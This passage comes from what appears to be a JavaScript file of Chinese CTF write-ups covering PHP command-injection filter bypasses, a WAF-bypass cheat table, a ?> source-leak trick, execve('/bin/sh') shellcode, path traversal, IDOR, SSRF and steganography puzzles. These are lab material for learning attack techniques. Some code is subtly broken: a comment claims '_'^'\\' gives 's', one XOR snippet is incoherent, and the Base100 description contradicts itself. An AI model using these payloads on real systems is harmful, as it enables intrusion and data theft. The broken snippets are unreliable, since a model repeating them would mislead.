// ezcmd_8: passthru + \u62FC\u63A5
POST qc=passthru("cat /fl"."ag")

// ezcmd_9: tab\u7ED5\u8FC7\u7A7A\u683C
POST qc=passthru("cat\\t/fl"."ag")
\`\`\`

## PHP \u6E90\u7801\u6CC4\u9732

\u7528 \`?>\` \u63D0\u524D\u7ED3\u675F PHP \u6807\u7B7E\uFF0C\u540E\u9762\u7684\u5185\u5BB9\u4F1A\u88AB\u5F53\u6210\u7EAF\u6587\u672C\u76F4\u63A5\u8F93\u51FA\uFF1A

\`\`\`
GET /?qc=readfile('flag.php')?>
\`\`\`

URL \u91CC\u8BB0\u5F97\u7F16\u7801\u4E3A \`%3F%3E\`\u3002

---

## \u7ED5\u8FC7\u901F\u67E5\u8868\uFF08\u66F4\u65B0\u7248\uFF09

| \u8FC7\u6EE4\u9879 | \u7ED5\u8FC7\u65B9\u6CD5 |
|--------|---------|
| \u7A7A\u683C | \`\${IFS}\`, \`<\`, \`{cat,/flag}\`, tab |
| \u5173\u952E\u8BCD\u62FC\u63A5 | \`"fl"."ag"\`, \`'fl'.'ag'\` |
| \u65E0\u5B57\u6BCDRCE | \`. /????.??? 2>&1\` (source\u6CC4\u9732) |
| \u6570\u5B57+\u5B57\u6BCD\u5168\u8FC7\u6EE4 | XOR \u6784\u9020\u5B57\u7B26 |
| system/exec | passthru, shell_exec, proc_open |
| \u8F93\u51FA\u91CD\u5B9A\u5411 | \`;#\` \u6CE8\u91CA\u540E\u9762 |

## XOR \u6784\u9020\u5B57\u7B26\u4E32\u6280\u5DE7

\u5F53 WAF \u8FDE\u5B57\u6BCD\u6570\u5B57\u90FD\u8FC7\u6EE4\u65F6\uFF0C\u53EF\u4EE5\u7528 XOR \u8FD0\u7B97\u7B26\u4ECE\u53EF\u7528\u5B57\u7B26\u4E2D\u62FC\u51FA\u76EE\u6807\u5B57\u7B26\u4E32\uFF1A

\`\`\`php
# \u76EE\u6807: \u6784\u9020 "system"
# \u7528 XOR \u4ECE\u4E24\u4E2A\u975E\u5B57\u6BCD\u5B57\u7B26\u62FC\u51FA\u5B57\u6BCD
$__ = ("_"^"\\");   // "_" ^ "\\" = "s"
# \u7EE7\u7EED XOR \u94FE\u62FC\u51FA\u5B8C\u6574\u51FD\u6570\u540D
$_("cat /fl*");
\`\`\`

**\u539F\u7406**\uFF1A\u5B57\u7B26\u7684 ASCII \u503C\u7ECF\u8FC7 XOR \u8FD0\u7B97\u540E\u53EF\u80FD\u5F97\u5230\u4EFB\u610F\u5B57\u6BCD\u3002\u5173\u952E\u662F\u627E\u5230 WAF \u653E\u884C\u7684\u5B57\u7B26\u7EC4\u5408\u3002\u53C2\u8003\uFF1A[php-chars-xor](https://github.com/ymgve/php-chars-xor)

---

**\u8E29\u5751\u6559\u8BAD**\uFF1A
1. \`2>&1\` \u8FD9\u4E2A stderr \u91CD\u5B9A\u5411\u662F\u771F\u6B63\u7684\u6740\u624B\u950F\uFF0C\u597D\u51E0\u6B21\u6211\u62FF\u5230\u4E86 payload \u5374\u770B\u4E0D\u5230 flag\uFF0C\u5C31\u662F\u5FD8\u4E86\u52A0\u5B83
2. \u65E0\u5B57\u6BCD\u573A\u666F\u522B\u6B7B\u78D5\u5B57\u6BCD\uFF0C\`.\`\u3001\`$()\`\u3001\u901A\u914D\u7B26\u90FD\u662F\u975E\u5B57\u6BCD\u7684\u53EF\u7528\u8D44\u6E90
3. PHP \u7684 \`?>\` \u95ED\u5408\u6807\u7B7E\u6280\u5DE7\u5F88\u5BB9\u6613\u88AB\u5FFD\u7565\uFF0C\u5B83\u672C\u8D28\u4E0A\u662F\u5728\u5229\u7528 PHP \u7684\u6DF7\u7F16\u673A\u5236
`
  },
  pwn: {
    title: "PWN \u4E0E\u9006\u5411",
    subtitle: "PWN & Reverse Engineering",
    content: `
\u8FD9\u6B21\u6765\u804A\u804A CTF \u4E2D\u4E24\u4E2A\u6700"\u786C\u6838"\u7684\u65B9\u5411\u2014\u2014PWN \u548C\u9006\u5411\u3002\u6211\u6311\u4E86\u4E09\u9053\u6709\u610F\u601D\u7684\u9898\u76EE\uFF0C\u96BE\u5EA6\u4ECE\u7B80\u5355\u5230\u56F0\u96BE\u90FD\u6709\u8986\u76D6\u3002

## X0r \u2014 \u9006\u5411\u4E2D\u7684\u6570\u636E\u63D0\u53D6

\u7ED9\u4E86\u4E00\u4E2A ELF binary\uFF0C\u7528 IDA \u6253\u5F00\u4E00\u770B\uFF0C\u6838\u5FC3\u903B\u8F91\u5C31\u662F\u4E24\u5C42 XOR\u3002\u5148\u628A\u6570\u636E\u63D0\u53D6\u51FA\u6765\uFF1A

\`\`\`python
cipher = [0x61, 0x6e, 0x75, 0x60, 0x79, 0x6d, 0x37, 0x77,
          0x4b, 0x4c, 0x6c, 0x24, 0x50, 0x5d, 0x76, 0x33,
          0x71, 0x25, 0x44, 0x5d, 0x6c, 0x48, 0x70, 0x69]
key1 = [0x14, 0x11, 0x45]
key2 = [0x13, 0x13, 0x51]
flag = ''.join(chr((c ^ key1[i%3]) ^ key2[i%3]) for i, c in enumerate(cipher))
# flag{y0u_Kn0W_b4s1C_xOr}
\`\`\`

**\u8E29\u5751**\uFF1A\u4ECE\u53CD\u6C47\u7F16\u63D0\u53D6\u5BC6\u6587\u65F6\uFF0C\u7B2C 4 \u5B57\u8282\u6211\u6284\u6210\u4E86 0x60\uFF0C\u800C\u5B9E\u9645\u5E94\u8BE5\u662F 0x79\u3002\u7ED3\u679C\u89E3\u5BC6\u51FA\u6765\u7B2C\u4E00\u4F4D\u4E0D\u662F \`g\` \u800C\u662F \`~\`\u3002\u505A\u9006\u5411\u7684\u65F6\u5019\uFF0C**\u6570\u636E\u63D0\u53D6\u4E00\u5B9A\u8981\u4ED4\u7EC6**\uFF01

## Pwn's Door \u2014 \u9006\u5411\u5BC6\u7801\u7B97\u6CD5

\u8FD9\u9053\u9898\u66F4\u7B80\u5355\uFF0Cbinary \u91CC scanf \u8BFB\u53D6\u4E86\u4E00\u4E2A\u6574\u6570\uFF0C\u7136\u540E\u548C 0x6b6579 \u505A\u6BD4\u8F83\uFF1A

\`\`\`
0x6b6579 = 'k' + 'e' + 'y' \u2192 \u5341\u8FDB\u5236 7038329
\`\`\`

\u8FDE\u63A5\u670D\u52A1\u5668\u7684 9999 \u7AEF\u53E3\uFF0C\u8F93\u5165\u8FD9\u4E2A\u6570\u5B57\uFF1A

\`\`\`
flag{6551ffb1-f3f2-42d2-bdc7-86ec5d2f2cca}
\`\`\`

## input_function \u2014 Shellcode \u7F16\u5199 \u2605\uFF08\u4E00\u8840\uFF09

\u91CD\u5934\u620F\u6765\u4E86\u3002\u8FD9\u9053\u9898\u8003\u7684\u662F\u771F\u6B63\u7684 PWN \u6838\u5FC3\uFF1Ashellcode \u7F16\u5199\u3002

\u7A0B\u5E8F\u903B\u8F91\u6781\u7B80\uFF1A

\`\`\`c
void *mem = mmap(0, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, ...);
read(0, mem, 0x1000);
((void(*)())mem)();  // \u76F4\u63A5\u6267\u884C\u7528\u6237\u8F93\u5165\uFF01
\`\`\`

\u76F4\u63A5\u5206\u914D\u4E86\u4E00\u5757 RWX \u5185\u5B58\uFF0C\u7136\u540E\u628A\u8F93\u5165\u7684\u5185\u5BB9\u5F53\u6210\u4EE3\u7801\u6267\u884C\u2014\u2014\u7ECF\u5178\u7684 shellcode \u6267\u884C\u573A\u666F\u3002

\u6211\u7684\u76EE\u6807\u662F\u5199\u4E00\u4E2A 23 \u5B57\u8282\u7684 \`execve("/bin/sh")\` shellcode\u3002\u7CFB\u7EDF\u8C03\u7528\u53F7 59\uFF0C\u53C2\u6570\u5E03\u5C40\uFF1Arax=59\uFF0Crdi=\u5B57\u7B26\u4E32\u5730\u5740\uFF0Crsi=0\uFF0Crdx=0\u3002

\`\`\`python
shellcode = bytes([
    0x48,0x31,0xf6,                         # xor rsi, rsi
    0x56,                                    # push rsi
    0x48,0xbf, 0x2f,0x62,0x69,0x6e,         # movabs rdi, "/bin//sh"
    0x2f,0x2f,0x73,0x68,
    0x57,                                    # push rdi
    0x54, 0x5f,                              # push rsp; pop rdi
    0x6a,0x3b, 0x58,                         # push 59; pop rax
    0x99,                                    # cdq (rdx=0)
    0x0f,0x05                                # syscall
])
\`\`\`

\u7EC6\u8282\u5728\u4E8E "/bin//sh" \u7528\u4E86\u4E24\u4E2A\u659C\u6760\u51D1\u9F50 8 \u5B57\u8282\u5BF9\u9F50\u3002\u538B\u6808\u540E\u7528 \`push rsp; pop rdi\` \u5DE7\u5999\u5730\u628A\u5B57\u7B26\u4E32\u5730\u5740\u53D6\u51FA\u6765\u3002

\`\`\`
flag{18744bff-3292-47b3-9f74-54a8e4b7f738}
\`\`\`

---

**\u603B\u7ED3**\uFF1A\u8FD9\u4E09\u9053\u9898\u4EE3\u8868\u4E86 CTF \u4E2D PWN \u548C\u9006\u5411\u7684\u5178\u578B\u601D\u8DEF\uFF1A\u6570\u636E\u63D0\u53D6\u4E0E\u7B97\u6CD5\u9006\u5411\u3001\u534F\u8BAE\u4EA4\u4E92\u3001\u4EE5\u53CA\u5E95\u5C42 shellcode \u7F16\u5199\u3002\u6BCF\u9053\u9898\u90FD\u4E0D\u7B97\u590D\u6742\uFF0C\u4F46\u62FC\u5728\u4E00\u8D77\uFF0C\u6B63\u597D\u8986\u76D6\u4E86\u8FD9\u4E2A\u65B9\u5411\u4ECE\u5165\u95E8\u5230\u8FDB\u9636\u7684\u6838\u5FC3\u6280\u80FD\u3002
`
  },
  stego: {
    title: "\u9690\u5199\u672F\u4E0E\u52A0\u5BC6",
    subtitle: "Steganography & Cryptography",
    content: `
\u9690\u5199\u672F\u7684\u6838\u5FC3\u601D\u60F3\u662F**\u8BA9\u79D8\u5BC6\u770B\u8D77\u6765\u4E0D\u50CF\u79D8\u5BC6**\u3002\u8FD9\u6B21\u6211\u9047\u5230\u4E86\u4E09\u79CD\u4E0D\u540C\u7684\u9690\u5199\u9898\uFF1A\u96F6\u5BBD\u5B57\u7B26\u3001EXIF \u56FE\u7247\u9690\u5199\u3001\u4EE5\u53CA ZIP \u591A\u91CD\u5BC6\u7801\u7834\u89E3\u3002

## \u96F6\u5BBD\u5B57\u7B26\u9690\u5199\uFF08Zero-Width Steganography\uFF09

\u96F6\u5BBD\u5B57\u7B26\u662F Unicode \u4E2D**\u770B\u4E0D\u89C1\u4E5F\u6253\u4E0D\u51FA\u6765**\u7684\u7279\u6B8A\u5B57\u7B26\u3002\u5B83\u4EEC\u5728\u5C4F\u5E55\u4E0A\u4E0D\u5360\u4EFB\u4F55\u4F4D\u7F6E\uFF0C\u4F46\u6587\u672C\u91CC\u786E\u5B9E\u5B58\u5728\u3002

\u5E38\u89C1\u96F6\u5BBD\u5B57\u7B26\uFF1A

| Unicode | \u540D\u79F0 | \u7F29\u5199 |
|---------|------|------|
| U+200C | \u96F6\u5BBD\u975E\u8FDE\u63A5\u7B26 | ZWNJ |
| U+200D | \u96F6\u5BBD\u8FDE\u63A5\u7B26 | ZWJ |
| U+202C | \u5F39\u51FA\u65B9\u5411\u683C\u5F0F\u5316 | PDF |
| U+FEFF | \u96F6\u5BBD\u975E\u65AD\u7A7A\u683C/BOM | BOM |

**\u7F16\u7801\u539F\u7406**\uFF1A\u7528 4 \u79CD\u96F6\u5BBD\u5B57\u7B26\uFF0C\u6BCF\u79CD\u7F16\u7801 2 \u4F4D\u3002

\`\`\`
ZWNJ = 00
ZWJ  = 01
PDF  = 10
BOM  = 11
\`\`\`

### \u5B9E\u6218\uFF1Akey3.docx \u4E2D\u7684\u9690\u85CF\u4FE1\u606F

key3.docx \u5176\u5B9E\u662F\u4E2A ZIP \u538B\u7F29\u5305\u3002\u89E3\u538B\u540E\u5728 \`docProps/core.xml\` \u7684 \`<dc:description>\` \u5B57\u6BB5\u91CC\u627E\u5230\u5927\u91CF\u96F6\u5BBD\u5B57\u7B26\uFF1A

\`\`\`xml
<dc:description>
  &#x200C;&#x200C;&#x200C;&#x200C;&#x200D;&#x202C;&#x202C;&#xFEFF;
  &lt;!-- key\u4F1A\u5728\u8FD9\u91CC\u5417\uFF1F--&gt;
</dc:description>
\`\`\`

\`&lt;!-- key\u4F1A\u5728\u8FD9\u91CC\u5417\uFF1F--&gt;\` \u662F\u969C\u773C\u6CD5\u3002\u771F\u6B63\u7684\u6570\u636E\u85CF\u5728\u524D\u9762 64 \u4E2A\u96F6\u5BBD\u5B57\u7B26\u91CC\u3002

**\u89E3\u7801\u6B65\u9AA4**\uFF1A

1. \u63D0\u53D6\u5168\u90E8\u96F6\u5BBD\u5B57\u7B26\uFF08\u5171 64 \u4E2A\uFF09
2. \u67E5\u8868\u8F6C\u4E8C\u8FDB\u5236\uFF1A\u6BCF\u4E2A\u5B57\u7B26\u8F6C 2 \u4F4D
3. 64 \xD7 2 = 128 \u4F4D = 16 \u5B57\u8282
4. \u6309 UTF-16BE \u89E3\u7801\uFF08\u6BCF\u5B57\u8282\u524D\u6709\u4E2A \`\\x00\`\uFF09

\`\`\`python
import zipfile, re

with zipfile.ZipFile('key3.docx') as z:
    core = z.read('docProps/core.xml').decode('utf-8')
    desc = re.search(r'<dc:description>([^<]*)</dc:description>', core).group(1)

zw_map = {'\\u200c': '00', '\\u200d': '01', '\\u202c': '10', '\\ufeff': '11'}
bits = ''.join(zw_map[c] for c in desc if c in zw_map)
text = ''
for i in range(0, len(bits), 8):
    byte = int(bits[i:i+8], 2)
    if byte != 0:
        text += chr(byte)
# text = "key3:666"
\`\`\`

\u89E3\u7801\u7ED3\u679C\uFF1A**\`key3:666\`**

**\u5173\u952E\u6559\u8BAD**\uFF1A\u4E00\u5F00\u59CB\u6211\u53EA\u7528\u4E86 ZWNJ=0\u3001ZWJ=1\uFF081 bit/\u5B57\u7B26\uFF09\uFF0C47 \u4F4D\u4E8C\u8FDB\u5236\u89E3\u4E0D\u51FA\u4EFB\u4F55\u4E1C\u897F\u3002\u6B63\u786E\u7B54\u6848\u662F 4 \u79CD\u5B57\u7B26 \xD7 2 bits/\u5B57\u7B26\uFF0C\u603B\u6570\u636E 128 \u4F4D\u3002

---

## EXIF \u56FE\u7247\u9690\u5199

\u62FF\u5230\u4E00\u4E2A flag.jpg\uFF0C\u8868\u9762\u4E0A\u662F\u7A7A\u767D\u56FE\uFF0C\u4F46\u6587\u4EF6\u5927\u5C0F 231KB \u660E\u663E\u4E0D\u5BF9\u52B2\u3002

\u5148\u7528 Python \u8BFB EXIF \u4FE1\u606F\uFF1A

\`\`\`python
from PIL import Image
img = Image.open('flag.jpg')
exif = img.getexif()
for tag_id, value in exif.items():
    print(tag_id, repr(value)[:100])
\`\`\`

\u5728 EXIF tag **40092** \u91CC\u53D1\u73B0\u9690\u85CF\u6570\u636E\uFF01

### \u4E09\u5C42 Base64 \u89E3\u7801

\u7B2C\u4E00\u5C42 Base64 \u89E3\u7801 \u2192 \u8FD8\u662F Base64 \u683C\u5F0F
\u7B2C\u4E8C\u5C42 Base64 \u89E3\u7801 \u2192 \u8FD8\u662F Base64 \u683C\u5F0F
\u7B2C\u4E09\u5C42 Base64 \u89E3\u7801 \u2192 **\`flag{Y0u_Ar0_decryp9_M2ster}\`**

\`\`\`python
import base64, struct

# \u4ECE EXIF \u63D0\u53D6\u6570\u636E
with open('flag.jpg', 'rb') as f:
    data = f.read()

# \u627E EXIF tag 40092\uFF080x9C9C\uFF09
idx = data.find(b'\\x9c\\x9c\\x00\\x10\\x00\\x01\\x03\\x00')
if idx >= 0:
    # \u63D0\u53D6 raw bytes
    raw_len = struct.unpack('<I', data[idx+4:idx+8])[0]
    raw = data[idx+8:idx+8+raw_len]
    # \u4E09\u5C42 Base64 \u89E3\u7801
    d1 = base64.b64decode(raw)
    d2 = base64.b64decode(d1)
    flag = base64.b64decode(d2).decode('utf-8')
    # flag{Y0u_Ar0_decryp9_M2ster}
\`\`\`

**\u6709\u610F\u601D\u7684\u5730\u65B9**\uFF1A\u56FE\u7247\u8868\u9762\u6253\u5F00\u540E\u663E\u793A\u7684\u662F **\`CTFshow{\u8FD9\u90FD\u80FD\u8BA9\u4F60\u627E\u5230}\`**\uFF0C\u5176\u5B9E\u662F\u8BF1\u9975 flag\u3002\u771F\u6B63\u7684 flag \u85CF\u5728 EXIF \u5143\u6570\u636E\u91CC\u3002

---

## ZIP \u591A\u91CD\u5BC6\u7801\u7834\u89E3

\u8FD9\u662F\u4E00\u4E2A\u7ECF\u5178\u7684"\u4E09\u6B65\u9501"\u5F0F\u5BC6\u7801\u9898\uFF1A\u4E09\u5C42 ZIP \u5957\u5A03\uFF0C\u6BCF\u5C42\u90FD\u6709\u4E00\u4E2A Key\uFF0C\u6700\u7EC8\u4E09\u4E2A Key \u62FC\u6210\u5BC6\u7801\u3002

### \u7B2C\u4E00\u5C42\uFF1A\u5916\u5C42 ZIP

\u76F4\u63A5\u89E3\u538B\uFF0C\u5F97\u5230\u4E00\u4E2A\u4F2A\u52A0\u5BC6\u7684 ZIP\uFF08\u7B2C\u4E8C\u5173.zip\uFF09\u3002\u7528 WinRAR \u6216 7-Zip \u7684"\u4FEE\u590D\u538B\u7F29\u6587\u4EF6"\u529F\u80FD\uFF0C\u6216\u8005\u6539 ZIP \u6587\u4EF6\u5934\u7684\u52A0\u5BC6\u6807\u5FD7\u4F4D\u5C31\u80FD\u89E3\u538B\u3002

\u89E3\u538B\u540E\u5F97\u5230\u4E09\u4E2A\u6587\u4EF6\uFF1A
- **key1.docx**\uFF1A\u5185\u542B 108 \u4E2A emoji
- **key2.txt**\uFF1A\u793E\u4F1A\u4E3B\u4E49\u6838\u5FC3\u4EF7\u503C\u89C2\u5B57\u7B26\u4E32
- **key3.docx**\uFF1A\u96F6\u5BBD\u9690\u5199
- **readme.txt**\uFF1A\u63D0\u793A"\u8981\u4E09\u4E2Akey\u62FC\u5728\u4E00\u8D77"

### \u7B2C\u4E8C\u5C42\uFF1AKey 1 \u2014 emoji Base100 \u89E3\u7801

key1.docx \u91CC\u6709 108 \u4E2A emoji\uFF0C\u770B\u8D77\u6765\u6BEB\u65E0\u610F\u4E49\u3002\u4F46\u6709\u4E00\u4E2A\u53EB **Base100** \u7684\u7F16\u7801\u6807\u51C6\uFF08\u7C7B\u4F3C\u4E8E Base64\uFF09\uFF0C\u7528 100 \u4E2A emoji \u6620\u5C04 0-99 \u7684\u6570\u5B57\u3002

\`\`\`python
# Base100 \u89E3\u7801\u539F\u7406
# 0-62 \u7684 ASCII \u5B57\u7B26\u76F4\u63A5\u6620\u5C04
# 63-99 \u7528 emoji \u6620\u5C04
# 108 emoji \u2192 108 \u5B57\u8282 \u2192 Base64 \u2192 \u4E2D\u6587\u6587\u672C
\`\`\`

\u89E3\u7801\u7ED3\u679C\uFF1A"\u770B\u6765\u4F60\u5DF2\u7ECF\u77E5\u9053zip\u4F2A\u52A0\u5BC6\u600E\u4E48\u7834\u89E3\u4E86\uFF0C\u90A3\u4E48\u5C31\u7ED9\u4F60\u4E00\u4E2Akey:**zsm**"

**Key 1 = zsm**

### \u7B2C\u4E09\u5C42\uFF1AKey 2 \u2014 \u793E\u4F1A\u4E3B\u4E49\u6838\u5FC3\u4EF7\u503C\u89C2\u89E3\u7801

key2.txt \u7684\u5185\u5BB9\u662F\uFF1A"\u6CD5\u6CBB\u656C\u4E1A\u6CD5\u6CBB\u656C\u4E1A\u516C\u6B63\u81EA\u7531\u6CD5\u6CBB\u548C\u8C10"

\u8FD9\u662F 12 \u4E2A\u793E\u4F1A\u4E3B\u4E49\u6838\u5FC3\u4EF7\u503C\u89C2\u8BCD\u8BED\uFF0C\u6BCF\u4E2A\u6620\u5C04\u4E00\u4E2A\u5341\u516D\u8FDB\u5236\u503C\uFF080x0-0xB\uFF09\uFF1A

\`\`\`
\u5BCC\u5F3A=0 \u6C11\u4E3B=1 \u6587\u660E=2 \u548C\u8C10=3
\u81EA\u7531=4 \u5E73\u7B49=5 \u516C\u6B63=6 \u6CD5\u6CBB=7
\u7231\u56FD=8 \u656C\u4E1A=9 \u8BDA\u4FE1=10 \u53CB\u5584=11
\`\`\`

\u5C06\u6BCF\u4E2A\u8BCD\u6620\u5C04\u4E3A hex \u6570\u5B57\uFF0C\u62FC\u63A5\u8D77\u6765\uFF1A
\`\`\`
\u6CD5\u6CBB(7) \u656C\u4E1A(9) \u6CD5\u6CBB(7) \u656C\u4E1A(9)
\u516C\u6B63(6) \u81EA\u7531(4) \u6CD5\u6CBB(7) \u548C\u8C10(3)
\u2192 0x79796473 \u2192 ASCII\u89E3\u7801 \u2192 "yyds"
\`\`\`

**Key 2 = yyds**

### \u7B2C\u56DB\u5C42\uFF1AKey 3 \u2014 \u96F6\u5BBD\u5B57\u7B26\u89E3\u7801

\u89C1\u4E0A\u6587\u96F6\u5BBD\u9690\u5199\u90E8\u5206\u3002key3.docx \u7684 \`dc:description\` \u5B57\u6BB5\u85CF\u4E86 64 \u4E2A\u96F6\u5BBD\u5B57\u7B26\uFF0C\u7528 4 \u79CD\u5B57\u7B26 \xD7 2 bits \u89E3\u7801\u5F97\u5230\uFF1A

**Key 3 = 666**

### \u6700\u7EC8\u5BC6\u7801

\u4E09\u4E2A Key \u62FC\u63A5\uFF1A**zsm** + **yyds** + **666** = **\`zsmyyds666\`**

\u7528\u8FD9\u4E2A\u5BC6\u7801\u89E3\u538B \`\u7B2C\u4E09\u5173.zip\`\uFF0C\u5F97\u5230 \`flag.jpg\`\uFF08EXIF \u9690\u5199\uFF0C\u89C1\u4E0A\u6587\uFF09\u3002

\`\`\`
\u6700\u7EC8 flag: flag{Y0u_Ar0_decryp9_M2ster}
\`\`\`

---

**\u8E29\u5751\u6559\u8BAD**\uFF1A
1. ZIP \u4F2A\u52A0\u5BC6 = \u6539\u52A0\u5BC6\u6807\u5FD7\u4F4D\uFF0C\u5E76\u975E\u771F\u7684\u52A0\u5BC6
2. Base100 \u4E0D\u662F npm \u7684 base100 \u5305\uFF08\u53EA\u6620\u5C04 0-99 \u6570\u5B57\uFF09\uFF0C\u800C\u662F\u5B8C\u6574\u7684 ASCII-emoji \u6620\u5C04
3. \u4E09\u4E2A Key \u76F4\u63A5\u62FC\u63A5\uFF0C\u4E2D\u95F4\u6CA1\u6709\u5206\u9694\u7B26
4. \u96F6\u5BBD\u9690\u5199\u4E0D\u8981\u53EA\u7528 2 \u79CD\u5B57\u7B26\uFF0C\u6807\u51C6\u5E93\u7528\u7684\u662F 4 \u79CD \xD7 2 bits
`
  },
  misc: {
    title: "\u6742\u9879\u4E0E\u7EFC\u5408",
    subtitle: "Miscellaneous",
    content: `
\u6742\u9879\u9898\u5F80\u5F80\u662F\u6700\u6709\u610F\u601D\u7684\uFF0C\u56E0\u4E3A\u4EC0\u4E48\u90FD\u6709\u53EF\u80FD\u8003\u5230\u3002\u8FD9\u91CC\u603B\u7ED3\u4E86\u51E0\u9053\u4E0D\u540C\u7C7B\u578B\u7684\u6742\u9879\u9898\u3002

## CTFHub \u5F69\u86CB

CTFHub \u5E73\u53F0\u6709\u4E00\u4E2A\u9690\u85CF\u7684\u5F69\u86CB\u9875\u9762\uFF0C\u4E0D\u9700\u8981\u767B\u5F55\u5C31\u80FD\u62FF\u5230 flag\uFF1A

\`\`\`bash
curl https://www.ctfhub.com/skill/easter_egg
# ctfhub{b644d27a30b450b2f170c4f19ef1dd85fb1efc5d}
\`\`\`

**\u6CE8\u610F**\uFF1A\u8FD9\u662F\u5E73\u53F0\u7684\u5F69\u86CB flag\uFF0C\u4E0D\u662F\u67D0\u9053\u5177\u4F53\u9898\u76EE\u7684 flag\u3002

---

## \u65E0\u5B57\u6BCD\u6570\u5B57 RCE \u8FDB\u9636

\u8FD9\u662F\u9752\u5C91 CTF \u4E2D\u7684 ezcmd_5\uFF08\u4E00\u8840\u9898\uFF09\uFF0CWAF \u8FC7\u6EE4\u4E86\u6240\u6709\u5B57\u6BCD\u548C\u6570\u5B57\uFF0C\u4F46\u4FDD\u7559\u4E86 \`+\`\u3001\`-\`\u3001\`*\`\u3001\`/\`\u3001\`^\`\uFF08XOR\uFF09\u3001\`\`\`\u3001\`$\`\`_\` \u7B49\u7B26\u53F7\u3002

**\u5173\u952E\u601D\u8DEF**\uFF1A

1. **\u6B63\u659C\u6760\u4E0D\u80FD\u7528**\uFF1F\u90A3\u7528\u53CD\u659C\u6760\uFF01XOR \u6784\u5EFA\u5B57\u6BCD
2. **\`system\` \u4E0D\u80FD\u76F4\u63A5\u5199**\uFF1F\u7528\u53D8\u91CF\u51FD\u6570 \`$_()\` \u52A8\u6001\u8C03\u7528
3. **\u901A\u914D\u7B26**\uFF1A\`/???/?????\` \u5339\u914D \`/bin/cat\`

\`\`\`php
$_="_";$$_($_);  // \u53D8\u91CF\u51FD\u6570\u8C03\u7528
// \u6216\u5229\u7528 XOR \u6784\u9020 "system"
$_="";$__=("_"^"\\");$___=($__^"\\");$$$_("cat /flag");
\`\`\`

\u4F46\u6700\u5DE7\u5999\u7684\u89E3\u6CD5\u662F\u7528 **Linux \u7684 \`.\` \u547D\u4EE4**\uFF08source \u7684\u522B\u540D\uFF09\uFF1A

\`\`\`bash
. /????.??? 2>&1
\`\`\`

\`\`\`.\` \u4E0D\u662F\u5B57\u6BCD\uFF0C\`1\`\u3001\`2\` \u4E5F\u4E0D\u662F\u5B57\u6BCD\uFF08\`2>&1\` \u91CD\u5B9A\u5411 stderr\uFF09\u3002\`/????.???\` \u7528\u901A\u914D\u7B26\u5339\u914D \`/flag.txt\`\u3002

**\u5173\u952E**\uFF1A\`system()\` \u53EA\u6355\u83B7 stdout\uFF0C\u800C source \u6267\u884C\u6587\u4EF6\u51FA\u9519\u65F6\u8D70 stderr\uFF0C\u5FC5\u987B \`2>&1\` \u624D\u80FD\u770B\u5230 flag\uFF01

---

## \u9690\u85CF\u6587\u4EF6\u4E0E\u6587\u6863 IDOR

\u8FD9\u9053\u9898\u662F CTFShow \u7684 basic_12\uFF0C\u7F51\u9875\u4E0A\u53EA\u663E\u793A"basic_12"\u4E00\u4E2A\u94FE\u63A5\uFF0C\u6CA1\u6709\u5176\u4ED6\u4FE1\u606F\u3002

\u6211\u5C1D\u8BD5\u7ED9 ID \u52A0\u4E86\u4E0D\u540C\u53C2\u6570\uFF1A

\`\`\`bash
# \u9ED8\u8BA4 ID=190\uFF0C\u8BD5\u8BD5 ID=121 \u770B\u770B
curl "http://target/?id=121"
# \u53D1\u73B0\u4E86\u4E00\u4E2A\u9690\u85CF\u6587\u6863\uFF01
\`\`\`

Flag \u76F4\u63A5\u51FA\u73B0\u5728\u9690\u85CF\u6587\u6863\u91CC\u3002\u8FD9\u79CD IDOR \u5C31\u662F\u9760\u731C ID \u503C\uFF0C\u4E0D\u9700\u8981\u4EFB\u4F55\u590D\u6742\u6280\u5DE7\u3002

---

## LFI \u8DEF\u5F84\u7A7F\u8D8A

\u9752\u5C91 CTF \u7684 ezinfoleak \u9898\uFF1A\u9875\u9762\u63D0\u4F9B\u4E00\u4E2A\u6587\u4EF6\u6D4F\u89C8\u529F\u80FD\uFF0C\u4F46\u9650\u5236\u4E86\u53EF\u8BBF\u95EE\u7684\u8DEF\u5F84\u3002

\u67E5\u770B\u9875\u9762\u6E90\u7801\u53D1\u73B0\u9650\u5236\u5728 \`/app/\` \u76EE\u5F55\u4E0B\uFF0C\u4F46 flag \u5728\u6839\u76EE\u5F55 \`/fl4g.txt\`\uFF1A

\`\`\`bash
# \u5355\u5C42 ../ \u4E0D\u591F\uFF0C\u5F97\u5F80\u4E0A\u7FFB 4 \u5C42
curl "http://target/?file=../../../../fl4g.txt"
# flag{...}
\`\`\`

**\u5173\u952E**\uFF1ALFI \u8DEF\u5F84\u7A7F\u8D8A\u7684\u6DF1\u5EA6\u5F88\u91CD\u8981\u3002\`../../../../\` = \u4ECE \`/app/some/sub/dir/\` \u56DE\u5230\u6839\u76EE\u5F55\u3002

---

## SSRF \u591A\u79CD\u534F\u8BAE\u7ED5\u8FC7

\u8FD9\u9053\u9898\u7684\u6838\u5FC3\u662F\u4E00\u4E2A SSRF \u6F0F\u6D1E\uFF0C\u9700\u8981\u5411 \`flag.php\` \u53D1\u9001 POST \u8BF7\u6C42\uFF0C\u4F46\u8981\u6C42 \`$_POST["key"] == $key\`\uFF08\u5F31\u7C7B\u578B\u6BD4\u8F83\uFF09\u3002

\u5C1D\u8BD5\u4E86\u4E09\u79CD\u534F\u8BAE\uFF1A

| \u534F\u8BAE | \u72B6\u6001 | \u8BF4\u660E |
|------|------|------|
| gopher:// | \u274C \u8D85\u65F6 | PHP curl \u672A\u7F16\u8BD1 gopher \u652F\u6301 |
| dict:// | \u2705 \u8FDE\u901A | \u80FD\u6536\u5230\u54CD\u5E94\u4F46\u65E0\u6CD5\u6784\u9020\u5B8C\u6574 POST |
| file:// | \u2705 \u53EF\u7528 | \u6210\u529F\u8BFB\u53D6\u4E86 index.php \u6E90\u7801 |

**\u5173\u952E\u53D1\u73B0**\uFF1A\`file://\` \u534F\u8BAE\u53EF\u4EE5\u76F4\u63A5\u8BFB\u53D6\u670D\u52A1\u7AEF\u7684 PHP \u6587\u4EF6\u6E90\u7801\uFF0C\u62FF\u5230\u4EE3\u7801\u903B\u8F91\u540E\u518D\u627E\u7ED5\u8FC7\u65B9\u6CD5\u3002

---

## \u53D8\u91CF\u8986\u76D6\u4E0E PHP \u5F31\u7C7B\u578B\u8FDB\u9636

ISCC \u7684\u4E00\u9053 Web \u9898\uFF1A\u4EE3\u7801\u4E2D\u6709\u53D8\u91CF\u8986\u76D6\u6F0F\u6D1E\uFF0C\u914D\u5408 PHP \u5F31\u7C7B\u578B\u7ED5\u8FC7\u3002

\`\`\`php
